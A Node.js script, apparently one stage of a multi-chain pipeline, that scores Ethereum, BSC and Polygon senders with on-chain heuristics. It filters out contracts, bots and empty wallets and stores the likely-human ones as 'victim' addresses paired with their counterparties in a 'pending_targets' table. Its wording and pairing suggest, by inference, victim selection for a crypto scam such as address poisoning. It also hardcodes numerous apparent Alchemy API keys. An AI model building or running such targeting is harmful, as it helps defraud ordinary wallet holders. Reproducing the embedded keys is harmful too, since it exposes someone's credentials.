import 'dotenv/config';
import { createPublicClient, http, fallback, getAddress, parseAbiItem } from 'viem';
import { mainnet, bsc, polygon } from 'viem/chains';
import { createClient } from '@supabase/supabase-js';

import { config } from '../lib/config.js';
import logger from '../lib/logger.js';
import { sendAlert, formatAlert } from '../lib/notifier.js';
import { setupGracefulShutdown, onShutdown } from '../lib/shutdown.js';

// ─── Supabase client ───
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
if (!supabaseUrl || !supabaseKey) {
  console.error('[analyzer] Missing Supabase credentials. Exiting.');
  process.exit(1);
}
const supabase = createClient(supabaseUrl, supabaseKey);

// --- MULTI‑CHAIN CONFIG ---
const chainName = config.chain || 'ethereum';
const chainCfg = config.getChainConfig ? config.getChainConfig() : null;

const CHAIN_IDS = { ethereum: 1, bsc: 56, polygon: 137 };
const chainId = chainCfg?.chainId || CHAIN_IDS[chainName] || 1;

logger.info(`[Stage 2 Analyzer] Running for chain: ${chainName} (ID: ${chainId})`);

const QUALIFIED_POLL_INTERVAL_MS = parseInt(process.env.QUALIFIED_POLL_INTERVAL_MS || '600000', 10);

const BLOCKS_40_DAYS_MAP = {
  ethereum: 288000n,
  bsc: 1152000n,
  polygon: 1728000n,
};
const BLOCKS_40_DAYS = BLOCKS_40_DAYS_MAP[chainName] || 288000n;

// ─── Viem RPC Client ───
const PUBLIC_FALLBACKS = {
  bsc: [
    'https://bnb-mainnet.g.alchemy.com/v2/alch_6gTznTT4QnX3_0IE9gkY-',
    'https://bsc-dataseed.binance.org',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_z1J_ESjjLVZwSBLNoep84',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_-NvhHn24EgwhuMt38pZJr',
    'https://rpc.ankr.com/bsc',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_8ToIPT9Z3R1iQ55nksx8b',
    'https://bsc.publicnode.com',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_Qy6hQXdtdVlE7Z4uVxt_A',
    'https://1rpc.io/bnb',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_rniHI4MxzjBfNZ4bxmDu5',
    'https://bsc.drpc.org',
    'https://bnb-mainnet.g.alchemy.com/v2/LW3i2zPypSVe0cl4BxCxI',
    'https://bnb-mainnet.g.alchemy.com/v2/alch_WQp652MAlfKFbtD1A-zNh'
  ],
  polygon: [
    'https://polygon-mainnet.g.alchemy.com/v2/CByFU5cCGAYyh8EHLamXD',
    'https://polygon-rpc.com',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_UdSkrC6LFs2HGS0VUGg5O',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_tAPr1C9JUzQZYax5pslu5',
    'https://rpc.ankr.com/polygon',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_Bq31mnvxmjdT70RCYLGLA',
    'https://polygon.llamarpc.com',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_17XYrB1qagYO9Edwxj7Cw',
    'https://polygon.publicnode.com',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_UQzY-saHkZZrowH7kylTu',
    'https://1rpc.io/polygon',
    'https://polygon-mainnet.g.alchemy.com/v2/c6MIVgnVjXC0kgDH4BItE',
    'https://polygon-mainnet.g.alchemy.com/v2/alch_3_N_bgLVSl1zoRzlypO11'
  ],
  ethereum: [
    'https://eth-mainnet.g.alchemy.com/v2/alch_F5VimAPoBoESKZ566us-U',
    'https://ethereum.publicnode.com',
    'https://eth-mainnet.g.alchemy.com/v2/alch_x_oSlpf2bnfc6brp-BgzA',
    'https://eth-mainnet.g.alchemy.com/v2/alch_tp8k4HI9tVpUEBmsF3kXc',
    'https://rpc.ankr.com/eth',
    'https://eth-mainnet.g.alchemy.com/v2/alch_7viyR-7wWLgc2i9suQ6hS',
    'https://eth.llamarpc.com',
    'https://eth-mainnet.g.alchemy.com/v2/ig-ZUQrtw2shXhW2NuT6W',
    'https://1rpc.io/eth',
    'https://eth-mainnet.g.alchemy.com/v2/alch_dFm-5A7LhWtYU3_4Y103o',
    'https://eth.drpc.org',
    'https://eth-mainnet.g.alchemy.com/v2/gODtbeuBQLkTJAm3e9tB1',
    'https://eth-mainnet.g.alchemy.com/v2/GsO461DZvmNGh4O4Ss5Et'
  ],
};

const viemChainMap = { ethereum: mainnet, bsc, polygon };
const rpcUrls = PUBLIC_FALLBACKS[chainName] || PUBLIC_FALLBACKS.ethereum;

const client = createPublicClient({
  chain: viemChainMap[chainName] || mainnet,
  transport: fallback(rpcUrls.map(url => http(url, { timeout: 15000 })), { rank: false }),
});

const transferEvent = parseAbiItem(
  'event Transfer(address indexed from, address indexed to, uint256 value)'
);

const ONCHAIN_LOOKBACK_BLOCKS = {
  ethereum: 7200n,
  bsc: 10000n,
  polygon: 10000n,
};
const LOOKBACK = ONCHAIN_LOOKBACK_BLOCKS[chainName] || 7200n;

// ─── Stage 1 Constants ───
const MIN_GAS_RESERVE_WEI = 2000000000000000n; // 0.002 native token
const MAX_NONCE_LIMIT = 1000;

let isFetching = false;

// ─── UTILITIES ───
async function withRetry(fn, context, maxAttempts = 3, baseDelay = 1000) {
  let lastError;
  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    try { return await fn(); }
    catch (error) {
      lastError = error;
      if (attempt < maxAttempts) {
        const delay = baseDelay * Math.pow(2, attempt - 1);
        logger.warn(`[${context}] Attempt ${attempt} failed: ${error.message}`);
        await new Promise(resolve => setTimeout(resolve, delay));
      } else break;
    }
  }
  throw lastError;
}

async function promiseAllLimit(tasks, limit = 10) {
  const results = [];
  for (let i = 0; i < tasks.length; i += limit) {
    results.push(...await Promise.all(tasks.slice(i, i + limit)));
  }
  return results;
}

// ─── STAGE 1: On-chain state checks (fast, standard JSON-RPC) ───
/**
 * Checks bytecode, nonce, and balance.
 * Returns { pass: boolean, reason: string }
 */
async function passesStageOne(address) {
  try {
    const checksumAddr = getAddress(address);
    const [code, nonce, balance] = await Promise.all([
      client.getBytecode({ address: checksumAddr }),
      client.getTransactionCount({ address: checksumAddr }),
      client.getBalance({ address: checksumAddr }),
    ]);

    if (code && code !== '0x') return { pass: false, reason: 'is_contract' };
    if (nonce >= MAX_NONCE_LIMIT) return { pass: false, reason: `high_nonce(${nonce})` };
    if (balance < MIN_GAS_RESERVE_WEI) return { pass: false, reason: 'low_balance' };

    return { pass: true, reason: 'eoa_ok' };
  } catch (err) {
    // RPC failure — fail open (don't block the pipeline)
    return { pass: true, reason: 'rpc_fail_stage1' };
  }
}

// ─── STAGE 2: BEHAVIORAL ANALYZER WITH TTL CACHE ───
const MAX_ANALYZED_CACHE = 10000;
const ANALYZED_CACHE_TTL_MS = 6 * 60 * 60 * 1000; // 6 hours
const ANALYZED_CACHE = new Map();

function setAnalyzedCache(key, passes) {
  if (ANALYZED_CACHE.has(key)) {
    ANALYZED_CACHE.delete(key);
  } else if (ANALYZED_CACHE.size >= MAX_ANALYZED_CACHE) {
    const oldest = ANALYZED_CACHE.keys().next().value;
    ANALYZED_CACHE.delete(oldest);
  }
  ANALYZED_CACHE.set(key, { passes, expiresAt: Date.now() + ANALYZED_CACHE_TTL_MS });
}

/**
 * Stage 1 + Stage 2 combined analysis.
 *
 * Stage 1 (fast): bytecode, nonce, balance — rejects contracts/exchanges/drained wallets
 * Stage 2 (heavy): behavioral heuristics with batch detection
 *
 * Checks:
 *   S1: Contract / nonce / balance
 *   S2-1: In-block batch detection (3+ transfers in same block)
 *   S2-2: Sustained batching (3+ blocks with batches)
 *   S2-3: Zero-gap ratio (>40% of intervals are 0 seconds)
 *   S2-4: Sleep-gap analysis (humans have > 4hr gaps)
 *   S2-5: Time-delta variance (bots have CV < 0.15)
 *   S2-6: dApp / receiver diversity (bots target 1-2 addresses)
 *   S2-7: On-chain frequency (bots fire 15+ txs in hours)
 *
 * @param {string} victimAddress - lowercase address of the sender/victim
 * @returns {Promise<boolean>} - true if likely human, false if likely bot
 */
async function passesBehavioralHeuristics(victimAddress) {
  const cacheKey = victimAddress.toLowerCase();

  // Check cache with TTL
  const cached = ANALYZED_CACHE.get(cacheKey);
  if (cached && Date.now() < cached.expiresAt) {
    return cached.passes;
  }

  try {
    // ─── STAGE 1 GATE: Fast on-chain state checks ───
    const stage1 = await passesStageOne(victimAddress);
    if (!stage1.pass) {
      setAnalyzedCache(cacheKey, false);
      return false;
    }

    const checksumAddr = getAddress(victimAddress);

    // ─── Source 1: DB high-value transfers ───
    const { data: dbTxs, error: dbErr } = await supabase
      .from('token_transfers')
      .select('block_timestamp, receiver, block_number')
      .eq('sender', cacheKey)
      .eq('chain_id', chainId)
      .order('block_timestamp', { ascending: true })
      .limit(50);

    const dbRows = (!dbErr && dbTxs) ? dbTxs : [];

    // ─── Source 2: On-chain recent Transfer logs (all tokens, last N blocks) ───
    let onChainLogs = [];
    try {
      const currentBlock = await client.getBlockNumber();
      const fromBlock = currentBlock > LOOKBACK ? currentBlock - LOOKBACK : 0n;

      onChainLogs = await client.getLogs({
        event: transferEvent,
        args: { from: checksumAddr },
        fromBlock,
        toBlock: currentBlock,
      });
    } catch (logErr) {
      logger.debug(`[Analyzer] getLogs failed for ${cacheKey}: ${logErr.message}. Using DB data only.`);
      onChainLogs = [];
    }

    // ─── BATCH DETECTION: Count transfers per block from on-chain logs ───
    const blockCounts = new Map(); // blockNumber → count of transfers in that block
    for (const log of onChainLogs) {
      const bn = Number(log.blockNumber);
      blockCounts.set(bn, (blockCounts.get(bn) || 0) + 1);
    }

    const blockCountsValues = [...blockCounts.values()];
    const maxBatchSize = blockCountsValues.length > 0 ? Math.max(...blockCountsValues) : 0;
    const batchBlockCount = blockCountsValues.filter(c => c >= 3).length;

    // Also count batches from DB rows (group by block_number)
    const dbBlockCounts = new Map();
    for (const row of dbRows) {
      if (row.block_number) {
        const bn = Number(row.block_number);
        dbBlockCounts.set(bn, (dbBlockCounts.get(bn) || 0) + 1);
      }
    }
    const dbMaxBatch = dbBlockCounts.size > 0 ? Math.max(...dbBlockCounts.values()) : 0;

    // Use the larger batch signal from either source
    const effectiveMaxBatch = Math.max(maxBatchSize, dbMaxBatch);
    const hasInBlockBatch = effectiveMaxBatch >= 3;
    const hasSustainedBatch = batchBlockCount >= 3;

    // ─── Combine all activity timestamps ───
    const allTimestamps = [];

    for (const tx of dbRows) {
      if (tx.block_timestamp) {
        allTimestamps.push(new Date(tx.block_timestamp).getTime());
      }
    }

    // From on-chain logs: group by block number for distinct transaction times
    const onChainBlockSet = new Set(onChainLogs.map(l => Number(l.blockNumber)));
    const onChainBlockNumbers = [...onChainBlockSet].sort((a, b) => a - b);

    const blockTimeMs = chainName === 'ethereum' ? 12000 : chainName === 'bsc' ? 3000 : 2000;
    const now = Date.now();
    let currentBlockNum = 0;
    try {
      currentBlockNum = Number(await client.getBlockNumber());
    } catch {
      currentBlockNum = 0;
    }

    for (const bn of onChainBlockNumbers) {
      const blocksAgo = currentBlockNum - bn;
      const approxTime = now - (blocksAgo * blockTimeMs);
      allTimestamps.push(approxTime);
    }

    // ─── ZERO-GAP COUNTING ───
    // Sort and count intervals, tracking zero-gaps (same-block activity)
    allTimestamps.sort((a, b) => a - b);

    const intervals = [];
    let zeroGapCount = 0;
    let totalIntervalCount = 0;

    for (let i = 1; i < allTimestamps.length; i++) {
      const gapMs = allTimestamps[i] - allTimestamps[i - 1];
      totalIntervalCount++;
      if (gapMs > 30000) {
        // Meaningful gap (> 30s = different activity burst)
        intervals.push(gapMs);
      } else {
        // Same-block or near-simultaneous activity
        zeroGapCount++;
      }
    }

    const zeroGapRatio = totalIntervalCount > 0 ? zeroGapCount / totalIntervalCount : 0;
    const hasHighZeroGapRatio = zeroGapRatio > 0.40;

    // Deduplicate for sleep/variance analysis (use burst-level timestamps)
    const dedupedTimes = [];
    for (const ts of allTimestamps) {
      if (dedupedTimes.length === 0 || (ts - dedupedTimes[dedupedTimes.length - 1]) > 30000) {
        dedupedTimes.push(ts);
      }
    }

    // ─── INSUFFICIENT DATA: give benefit of the doubt ───
    if (dedupedTimes.length < 5 && onChainLogs.length < 5 && dbRows.length < 5) {
      setAnalyzedCache(cacheKey, true);
      return true;
    }

    // ─── CHECK 1: Sleep-Gap Analysis ───
    let hasSleepGap = true;
    if (dedupedTimes.length >= 3) {
      let maxGapMs = 0;
      for (let i = 1; i < dedupedTimes.length; i++) {
        const gap = dedupedTimes[i] - dedupedTimes[i - 1];
        if (gap > maxGapMs) maxGapMs = gap;
      }
      hasSleepGap = maxGapMs > (4 * 60 * 60 * 1000);
    }

    // ─── CHECK 2: Time-Delta Variance (CV) ───
    let isProgrammaticInterval = false;
    if (intervals.length >= 5) {
      const mean = intervals.reduce((a, b) => a + b, 0) / intervals.length;
      const variance = intervals.reduce((acc, v) => acc + Math.pow(v - mean, 2), 0) / intervals.length;
      const cv = mean === 0 ? 0 : Math.sqrt(variance) / mean;
      isProgrammaticInterval = cv < 0.15;
    }

    // ─── CHECK 3: dApp / Receiver Diversity ───
    const dbReceivers = new Set(dbRows.map(t => (t.receiver || '').toLowerCase()));
    const onChainReceivers = new Set(onChainLogs.map(l => l.args.to.toLowerCase()));
    const allUniqueReceivers = new Set([...dbReceivers, ...onChainReceivers]);
    const hasDiversity = allUniqueReceivers.size >= 3;

    // ─── CHECK 4: On-chain Frequency ───
    const onChainTxCount = onChainBlockNumbers.length;
    const isHighFrequency = onChainTxCount > 15;

    // ─── FINAL VERDICT ───
    const isLikelyBot = (
      // Signal combo A: never sleeps AND robotic timing
      (!hasSleepGap && isProgrammaticInterval) ||
      // Signal combo B: high frequency AND robotic timing
      (isHighFrequency && isProgrammaticInterval) ||
      // Signal combo C: high frequency AND no diversity AND no sleep
      (isHighFrequency && !hasDiversity && !hasSleepGap) ||
      // Signal combo D: in-block batching AND sustained across multiple blocks
      (hasInBlockBatch && hasSustainedBatch) ||
      // Signal combo E: in-block batching AND high frequency
      (hasInBlockBatch && isHighFrequency) ||
      // Signal combo F: in-block batching AND high zero-gap ratio AND no diversity
      (hasInBlockBatch && hasHighZeroGapRatio && !hasDiversity) ||
      // Signal combo G: sustained batching AND no sleep
      (hasSustainedBatch && !hasSleepGap)
    );

    const isHuman = !isLikelyBot;

    setAnalyzedCache(cacheKey, isHuman);
    return isHuman;

  } catch (err) {
    logger.error(`[Analyzer] Error analyzing ${victimAddress}: ${err.message}`);
    setAnalyzedCache(cacheKey, true);
    return true;
  }
}

// ─── MAIN EXECUTION ───
async function fetchPendingTargets() {
  if (isFetching) {
    logger.warn('Stage 2 analysis still running from previous interval. Skipping.');
    return;
  }
  isFetching = true;

  try {
    logger.info('Fetching qualified pairs and running Stage 1 + Stage 2 heuristics...');

    const maxBlockData = await withRetry(async () => {
      const { data, error } = await supabase
        .from('token_transfers')
        .select('block_number')
        .eq('chain_id', chainId)
        .order('block_number', { ascending: false })
        .limit(1);
      if (error) throw error;
      return data;
    }, 'GetMaxBlock');

    if (!maxBlockData || maxBlockData.length === 0) {
      logger.info('No transfers found in database for this chain yet.');
      return;
    }

    const maxBlockBigInt = BigInt(maxBlockData[0].block_number);
    const thresholdBlock = Math.max(0, Number(maxBlockBigInt - BLOCKS_40_DAYS));

    logger.info(`Threshold block for 40-day window: ${thresholdBlock} (max block: ${maxBlockData[0].block_number})`);

    const BATCH_SIZE = 1000;
    let totalInserted = 0;
    let totalFiltered = 0;
    let pageCount = 0;

    while (true) {
      pageCount++;
      const rows = await withRetry(async () => {
        const { data, error } = await supabase
          .rpc('fetch_pending_targets', {
            chain_id_param: chainId,
            threshold_block: thresholdBlock,
            offset_val: 0,
            limit_val: BATCH_SIZE,
          });
        if (error) throw error;
        return data;
      }, `FetchPendingTargetsRPC_page_${pageCount}`);

      if (!rows || rows.length === 0) break;

      logger.info(`Fetched ${rows.length} raw pairs (page ${pageCount}). Running Stage 1 + Stage 2 checks...`);

      const evaluationResults = await promiseAllLimit(
        rows.map(async (row) => {
          const isHuman = await passesBehavioralHeuristics(row.sender.toLowerCase());
          if (!isHuman) {
            return null;
          }
          return {
            chain: chainName,
            counterparty: row.receiver.toLowerCase(),
            victim: row.sender.toLowerCase(),
            processed: false,
          };
        }),
        10
      );

      const insertData = evaluationResults.filter(r => r !== null);
      const filteredCount = rows.length - insertData.length;
      totalFiltered += filteredCount;

      if (insertData.length > 0) {
        const insertedCount = await withRetry(async () => {
          const { data, error } = await supabase
            .from('pending_targets')
            .upsert(insertData, {
              onConflict: 'chain,counterparty,victim',
              ignoreDuplicates: true,
            })
            .select();
          if (error) throw error;
          return data ? data.length : 0;
        }, `BulkUpsertTargets_page_${pageCount}`);

        totalInserted += insertedCount;
        logger.info(`Page ${pageCount}: +${insertedCount} human targets | ${filteredCount} bots filtered`);
      } else {
        logger.info(`Page ${pageCount}: All ${rows.length} rejected by heuristics.`);
      }

      if (rows.length < BATCH_SIZE) break;
      if (pageCount > 100) {
        logger.warn('Reached pagination safety limit. Stopping.');
        break;
      }
    }

    // ─── Summary ───
    const { count: totalCount, error: countError } = await supabase
      .from('pending_targets')
      .select('*', { count: 'exact', head: true })
      .eq('chain', chainName);

    const totalInDb = countError ? 'Unknown' : totalCount;

    logger.info(`[Stage 2] Run complete. Added: ${totalInserted} | Filtered: ${totalFiltered} bots | Total in DB: ${totalInDb}`);

    if (totalInserted > 0 || totalFiltered > 0) {
      await sendAlert(
        `📊 [${chainName.toUpperCase()}] Stage 2: +${totalInserted} human targets confirmed, ${totalFiltered} bots filtered. Total pending: ${totalInDb}`
      );
    }

  } catch (error) {
    logger.error(`[Stage 2] Fatal error: ${error.message}`);
    await sendAlert(formatAlert('error', { source: 'Stage2Analyzer', error: error.message }));
  } finally {
    isFetching = false;
  }
}

async function startObserver() {
  logger.info('Starting Stage 2 Behavioral Analyzer (continuous mode)');
  logger.info(`Polling interval: ${QUALIFIED_POLL_INTERVAL_MS / 1000}s | Chain: ${chainName} | Lookback: ${LOOKBACK} blocks`);

  await fetchPendingTargets();

  setInterval(async () => {
    try {
      await fetchPendingTargets();
    } catch (err) {
      logger.error(`[Stage 2] Polling error: ${err.message}`);
    }
  }, QUALIFIED_POLL_INTERVAL_MS);
}

setupGracefulShutdown();
onShutdown(async () => {
  logger.info('[Stage 2] Analyzer shutting down gracefully.');
});

startObserver().catch(async (err) => {
  logger.error(`[Stage 2] Fatal startup error: ${err.message}`);
  await sendAlert(formatAlert('error', { source: 'Stage2Startup', error: err.message }));
  process.exit(1);
});